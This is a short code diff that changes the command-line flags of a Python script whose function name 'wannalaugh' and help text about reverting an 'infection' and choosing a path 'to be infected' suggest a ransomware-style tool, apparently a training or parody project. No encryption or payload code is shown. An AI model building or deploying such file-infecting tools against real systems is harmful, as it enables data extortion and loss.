@@ -117,11 +117,11 @@ def wannalaugh(key, silent, path):
 def main(): 
     parser = argparse.ArgumentParser()
     parser.version = '1.0.1'
-    parser.add_argument('-help', action='help', help='display this help menu')
-    parser.add_argument('-version', action='version', help='display app version')
-    parser.add_argument('-silent', default='False', action='store_true', help='silence stdout')
-    parser.add_argument('-revert', help='with a correct key you can revert the infection')
-    parser.add_argument('-path', default = './infection/', help='decide the path to be infected')
+    parser.add_argument('-h', '--help', action='help', help='display this help menu')
+    parser.add_argument('-v', '--version', action='version', help='display app version')
+    parser.add_argument('-s', '--silent', default='False', action='store_true', help='silence stdout')
+    parser.add_argument('-r', '--revert', help='with a correct key you can revert the infection')
+    parser.add_argument('-p', '--path', default = './infection/', help='decide the path to be infected')
     args = parser.parse_args()    
     
     silent = args.silent
